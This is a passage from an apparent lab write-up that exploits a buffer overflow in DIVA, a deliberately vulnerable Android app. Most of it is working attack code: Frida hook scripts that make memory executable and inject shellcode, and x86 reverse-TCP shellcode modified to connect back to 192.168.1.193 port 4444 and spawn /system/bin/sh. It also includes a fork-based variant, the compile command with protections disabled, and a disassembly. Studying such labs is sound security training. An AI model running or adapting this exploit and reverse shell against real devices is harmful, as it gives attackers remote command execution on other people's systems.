<br>Two possible candidates are:
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<p class="message">
<br>&nbsp;&nbsp;{
<br>&nbsp;&nbsp;&nbsp;&nbsp;"name": "base.odex",
<br>&nbsp;&nbsp;&nbsp;&nbsp;"base": "0xcf4c8000",
<br>&nbsp;&nbsp;&nbsp;&nbsp;"size": 3670016,
<br>&nbsp;&nbsp;&nbsp;&nbsp;"path": "/data/app/jakhar.aseem.diva-1/oat/x86/base.odex"
<br>&nbsp;&nbsp;},
<br>&nbsp;&nbsp;{
<br>&nbsp;&nbsp;&nbsp;&nbsp;"name": "libdivajni.so",
<br>&nbsp;&nbsp;&nbsp;&nbsp;"base": "0xe30aa000",
<br>&nbsp;&nbsp;&nbsp;&nbsp;"size": 12288,
<br>&nbsp;&nbsp;&nbsp;&nbsp;"path": "/data/app/jakhar.aseem.diva-1/lib/x86/libdivajni.so"
<br>&nbsp;&nbsp;},
</p>
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>But we cannot forget that ASLR is enabled, this means the libs are randomized. Left to try to app base address.
<br>After reboot we can see\
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<p class="message">
<br>&nbsp;&nbsp;{
<br>&nbsp;&nbsp;&nbsp;&nbsp;"name": "base.odex",
<br>&nbsp;&nbsp;&nbsp;&nbsp;"base": "0xcf8d9000",
<br>&nbsp;&nbsp;&nbsp;&nbsp;"size": 3670016,
<br>&nbsp;&nbsp;&nbsp;&nbsp;"path": "/data/app/jakhar.aseem.diva-1/oat/x86/base.odex"
<br>&nbsp;&nbsp;},
<br>&nbsp;&nbsp;{
<br>&nbsp;&nbsp;&nbsp;&nbsp;"name": "libdivajni.so",
<br>&nbsp;&nbsp;&nbsp;&nbsp;"base": "0xcf77b000",
<br>&nbsp;&nbsp;&nbsp;&nbsp;"size": 12288,
<br>&nbsp;&nbsp;&nbsp;&nbsp;"path": "/data/app/jakhar.aseem.diva-1/lib/x86/libdivajni.so"
<br>&nbsp;&nbsp;},
</p>
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Oh no, binary has compiled with PIE.
<br>Ok we have to find module address at runtime with frida.
<br>It works!! But shellcode SEGFAULT.
<br>![14-74](https://teckk2.github.io/assets/images/DIVA/14-74.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Java.vm.env handle: " + handlePointer);
<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] GetStringUTFChars addr: " + GetStringUTFChars);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(GetStringUTFChars, {
<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var fuck = retval.readCString();
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(40);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var blah = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var shell = [0xff, 0xb3, 0x04, 0x00, 0x00, 0x00, 0xff, 0xa3, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xa3, 0x0c, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x00, 0xe9, 0xe0, 0xff, 0xff, 0xff, 0xff, 0xa3, 0x10, 0x00, 0x00, 0x00, 0x68, 0x08, 0x00, 0x00, 0x00, 0xe9, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xa3, 0x14, 0x00];
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var sh = Process.getModuleByName('base.odex').base;
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.protect(ptr(sh), 1024, 'rwx');
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(sh, shell);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var ps = sh.toString().match(/[\s\S]{1,2}/g) || [];
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;blah.push(parseInt(ps[4], 16), parseInt(ps[3], 16), parseInt(ps[2], 16), parseInt(ps[1], 16));
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, blah);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fuck == "bof"){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(sh);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(st));
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(sh, {length: 1024}));
<br>}
<br>&nbsp;&nbsp;&nbsp;&nbsp;});
<br>&nbsp;&nbsp;}
<br>&nbsp;&nbsp;catch(e) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
<br>&nbsp;&nbsp;}
<br>});
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>After various test we understood. Objdump dump in linux format, we need to use some other android tool.
<br>Fortunately in android toolchain there is a proper version of objdump.
<br>Dump shellcode again, adjust exploit and test it again.
<br>Ok this is first problem, the second is that if we overwrite binary, when It needs to call libc functions, it doesnt find plt table.
<br>Third problem is that the shellcode is full of nullbytes.
<br>**Now let’s solve memory area problem**
<br>As we already told, when function GetStringUTFChars ret, it frees malloc and this cause Jump to bad (corrupted) address, plus the GetStringUTFChars functions are called multilple times, not only for take my input, and everytime it is called, new malloc with shellcode is created.
<br>To solve this problem we changed the logic of program, and create malloc at the beginnig of hook.
<br>![14-75](https://teckk2.github.io/assets/images/DIVA/14-75.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Java.vm.env handle: " + handlePointer);
<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] GetStringUTFChars addr: " + GetStringUTFChars);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(40);
<br>&nbsp;&nbsp;&nbsp;&nbsp;var blah = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;var shell = [];
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;var sh = Memory.alloc(128);
<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.protect(ptr(sh), 128, 'rwx');
<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(sh, shell);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;var ps = sh.toString().match(/[\s\S]{1,2}/g) || [];
<br>&nbsp;&nbsp;&nbsp;&nbsp;blah.push(parseInt(ps[4], 16), parseInt(ps[3], 16), parseInt(ps[2], 16), parseInt(ps[1], 16));
<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, blah);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(GetStringUTFChars, {
<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var fuck = retval.readCString();
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fuck == "bof"){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(sh);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(st));
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(sh, {length: 128}));
<br>&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;&nbsp;&nbsp;});
<br>&nbsp;&nbsp;}
<br>&nbsp;&nbsp;catch(e) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
<br>&nbsp;&nbsp;}
<br>});
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Let’s try now simple reverse TCP shellcode (no libc, nullfree)
<br>We abandoned old one and try to play this new one that it is a classic linux x68 shellcode: [http://shell-storm.org/shellcode/files/shellcode-833.php](http://shell-storm.org/shellcode/files/shellcode-833.php)
<br>![14-76](https://teckk2.github.io/assets/images/DIVA/14-76.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>*/                                                                                                                                                                           <br>                                                                                                                                            
<br>#include <stdio.h>
<br>#include <string.h>
<br>
<br>unsigned char code[] = \
<br>
<br>"\x68"
<br>"\x7f\x01\x01\x01"  // <- IP Number "127.1.1.1"
<br>"\x5e\x66\x68"
<br>"\xd9\x03"          // <- Port Number "55555"
<br>"\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
<br>"\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
<br>"\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
<br>"\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
<br>"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
<br>"\xeb\xce";
<br>
<br>main ()
<br>{
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// When the IP contains null-bytes, printf will show a wrong shellcode length.
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;printf("Shellcode Length:  %d\n", strlen(code));
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;// Pollutes all registers ensuring that the shellcode runs in any circumstance.
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;__asm__ ("movl $0xffffffff, %eax\n\t"
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"movl %eax, %ebx\n\t"
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"movl %eax, %ecx\n\t"
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"movl %eax, %edx\n\t"
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"movl %eax, %esi\n\t"
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"movl %eax, %edi\n\t"
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"movl %eax, %ebp");
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;int (*ret)() = (int(*)())code;
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;ret();
<br>
<br>}
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Let’s edit the new shellcode
<br>We have to do the following things:
<br>&nbsp;&nbsp;•	Change IP Address
<br>&nbsp;&nbsp;•	Change Port
<br>&nbsp;&nbsp;•	Change /bin/sh with /system/bin/sh
<br>The first 2 steps are easy, but last is not simple as replace string.
<br>The string is pushed in little endian, and every 4 bytes it pushed to stack, and we have to manually add push instruction.
<br>Finally done.
<br>Working shellcode (tested with the following testing shellcode script)
<br>![14-77](https://teckk2.github.io/assets/images/DIVA/14-77.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>#include<stdio.h>                                                                                                                                                             <br>#include<string.h>
<br>
<br>unsigned char code[] = \
<br>"\x6a\x66\x58\x99\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x93\x89\xd1\xb0"
<br>"\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x87\xda\x68"
<br>"\xc0\xa8\x01\xc1"  // <--- ip address
<br>"\x66\x68"
<br>"\x11\x5c"          // <--- tcp port
<br>"\x66\x53\x43\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x6a\x0b\x58\x99\x89\xd1"
<br>"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x74\x65\x6d\x2f\x68\x2f\x73\x79\x73\x89\xe3\xcd\x80";
<br>
<br>main()
<br>{
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;printf("Shellcode Length:  %d\n", strlen(code));
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;int (*ret)() = (int(*)())code;
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;ret();
<br>
<br>}
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Compiled with:
<p class="message">
  android-ndk-r12b/x86/bin/i686-linux-android-gcc shellcode.c -o shellcode -fno-stack-protector -z execstack -m32 –pie
</p>
<br>Pushed to android, ran it and reverse shell popped up :)
<br>Finally it works, what the ride to hell…
<br>The shellcode, tested on shellcode tester cross-compiled worked fine, yeah!!
<br>![14-78](https://teckk2.github.io/assets/images/DIVA/14-78.png)
<br>But unfortunately the reverse shell dies after few moment of connecting
<br>But…
<br>We copied the last edited shellcode to memory, call it and all worked fine....or not?
<br>The reverse shell arrived but the process died immediately, killing also reverse shell.
<br>![14-79](https://teckk2.github.io/assets/images/DIVA/14-79.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Java.vm.env handle: " + handlePointer);
<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] GetStringUTFChars addr: " + GetStringUTFChars);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(40);
<br>&nbsp;&nbsp;&nbsp;&nbsp;var blah = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;var shell = [0x6a, 0x66, 0x58, 0x99, 0x52, 0x42, 0x52, 0x89, 0xd3, 0x42, 0x52, 0x89, 0xe1, 0xcd, 0x80, 0x93, 0x89, 0xd1, 0xb0, 0x3f, 0xcd, 0x80, 0x49, 0x79, 0xf9, 0xb0, 0x66, 0x87, 0xda, 0x68, 0xc0, 0xa8, 0x01, 0xc1, 0x66, 0x68, 0x11, 0x5c, 0x66, 0x53, 0x43, 0x89, 0xe1, 0x6a, 0x10, 0x51, 0x52, 0x89, 0xe1, 0xcd,>
<br>&nbsp;&nbsp;&nbsp;&nbsp;var sh = Memory.alloc(128);
<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.protect(ptr(sh), 128, 'rwx');
<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(sh, shell);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(sh);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;var ps = sh.toString().match(/[\s\S]{1,2}/g) || [];
<br>&nbsp;&nbsp;&nbsp;&nbsp;blah.push(parseInt(ps[4], 16), parseInt(ps[3], 16), parseInt(ps[2], 16), parseInt(ps[1], 16));
<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, blah);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(GetStringUTFChars, {
<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var fuck = retval.readCString();
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fuck == "bof"){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(st));
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(sh, {length: 128}));
<br>&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;&nbsp;&nbsp;});
<br>&nbsp;&nbsp;}
<br>&nbsp;&nbsp;catch(e) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
<br>&nbsp;&nbsp;}
<br>});
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>![14-80](https://teckk2.github.io/assets/images/DIVA/14-80.png)
<br>![14-81](https://teckk2.github.io/assets/images/DIVA/14-81.png)
<br>As you can see in the screenshot the shell dies immediately
<p class="message">
<br>gef➤  si
<br>Warning:
<br>Cannot insert breakpoint 1.
<br>Cannot access memory at address 0xcde90ad0
<br>
<br>Command aborted.
</p>
<br>From execve man:
<p class="message">
  execve() executes the program referred to by pathname. This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initialized and uninitialized) data segments.
</p>
<br>Maybe is it the issue?
<br>Let’s preserve memory area
<br>Just I done in chapter, instead using malloc memory I overwritten a small section of binary.
<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[*] Java.vm.env handle: " + handlePointer);
<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[*] GetStringUTFChars addr: " + GetStringUTFChars);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(40);
<br>&nbsp;&nbsp;&nbsp;&nbsp;var blah = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;var shell = [0x6a, 0x66, 0x58, 0x99, 0x52, 0x42, 0x52, 0x89, 0xd3, 0x42, 0x52, 0x89, 0xe1, 0xcd, 0x80, 0x93, 0x89, 0xd1, 0xb0, 0x3f, 0xcd, 0x80, 0x49, 0x79, 0xf9, 0xb0, 0x66, 0x87, 0xda, 0x68, 0xc0, 0xa8, 0x01, 0xc1, 0x66, 0x68, 0x11, 0x5c, 0x66, 0x53, 0x43, 0x89, 0xe1, 0x6a, 0x10, 0x51, 0x52, 0x89, 0xe1, 0xcd];
<br>&nbsp;&nbsp;&nbsp;&nbsp;//var sh = Memory.alloc(128);
<br>&nbsp;&nbsp;&nbsp;&nbsp;var sh = Process.getModuleByName('base.odex').base.add(0x50);  // <----- HERE
<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.protect(ptr(sh), 128, 'rwx');
<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(sh, shell);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(sh);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;var ps = sh.toString().match(/[\s\S]{1,2}/g) || [];
<br>&nbsp;&nbsp;&nbsp;&nbsp;blah.push(parseInt(ps[4], 16), parseInt(ps[3], 16), parseInt(ps[2], 16), parseInt(ps[1], 16));
<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, blah);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(GetStringUTFChars, {
<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var fuck = retval.readCString();
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fuck == "bof"){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(st));
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(sh, {length: 128}));
<br>&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;&nbsp;&nbsp;});
<br>&nbsp;&nbsp;}
<br>&nbsp;&nbsp;catch(e) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
<br>&nbsp;&nbsp;}
<br>});
<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Unfortunately it has not solved the problem.
<br>Let’s try forking the process
<br>we edited our shellcode again, to add forking process and now the shellcode is spawned without killing Diva process nor itself.
<br>Haha it worked finally
<p class="message">
  \x29\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x02\xeb\x05\x29\xc0\x40\xcd\x80\x6a\x66\x58\x99\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x87\xda\x68\xc0\xa8\x01\xc1\x66\x68\x11\x5c\x66\x53\x43\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x6a\x0b\x58\x99\x89\xd1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x74\x65\x6d\x2f\x68\x2f\x73\x79\x73\x89\xe3\xcd\x80
</p>
<br>In assembly it is:
<p class="message">
<br># ndisasm -b32 final_shellcode
<br>/* main: if (fork()) goto exit; else goto execve; */
<br>00000000&nbsp;&nbsp;29C0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;eax,eax
<br>00000002&nbsp;&nbsp;B002&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;al,0x2
<br>00000004&nbsp;&nbsp;CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* Fork syscall #2 */
<br>00000006&nbsp;&nbsp;85C0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;eax,eax
<br>00000008&nbsp;&nbsp;7502&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nz&nbsp;&nbsp;0xc
<br>0000000A&nbsp;&nbsp;EB05&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;&nbsp;short 0x11
<br>
<br>/* exit: exit(x); */
<br>0000000C&nbsp;&nbsp;29C0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;eax,eax 
<br>0000000E&nbsp;&nbsp;40&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;&nbsp;eax
<br>0000000F&nbsp;&nbsp;CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nt 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* Exit syscall #1 */
<br>
<br>/* start:&nbsp;&nbsp;execve() */
<br>00000011&nbsp;&nbsp;6A66&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;byte&nbsp;&nbsp;+0x66
<br>00000013&nbsp;&nbsp;58&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;eax
<br>00000014&nbsp;&nbsp;99&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cdq
<br>00000015&nbsp;&nbsp;52&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;edx
<br>00000016&nbsp;&nbsp;42&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;&nbsp;edx
<br>00000017&nbsp;&nbsp;52&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;edx
<br>00000018&nbsp;&nbsp;89D3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;ebx,edx
<br>0000001A&nbsp;&nbsp;42&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;&nbsp;edx
<br>0000001B&nbsp;&nbsp;52&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;edx
<br>0000001C&nbsp;&nbsp;89E1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;ecx,esp
